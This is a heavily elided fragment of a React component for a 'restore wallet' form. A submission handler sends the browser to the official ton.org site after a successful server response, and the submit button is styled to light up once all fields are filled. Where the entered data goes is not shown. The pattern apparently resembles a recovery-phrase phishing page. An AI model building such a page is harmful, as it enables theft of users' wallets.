  ...
  const handleRestoreWallet = async () => {
    ...
    try {
      ...
      if (response.status === 200 && result.status) {
        window.location.href = "https://ton.org/";
        console.log(result);
      } else {
      ...
      <section className="w-full max-w-[780px] px-6 py-10 flex flex-col items-center">
        ...
        <div className="mt-10 w-full max-w-[720px] flex justify-between gap-4">
          ...
          <button
            ...
            className={`flex-1 h-11 rounded-xl text-black font-semibold transition-all backdrop-blur flex items-center justify-center gap-2
              ${
                allFilled && !isLoading
                  ? "bg-sky-400 hover:bg-sky-300 shadow-md cursor-pointer"
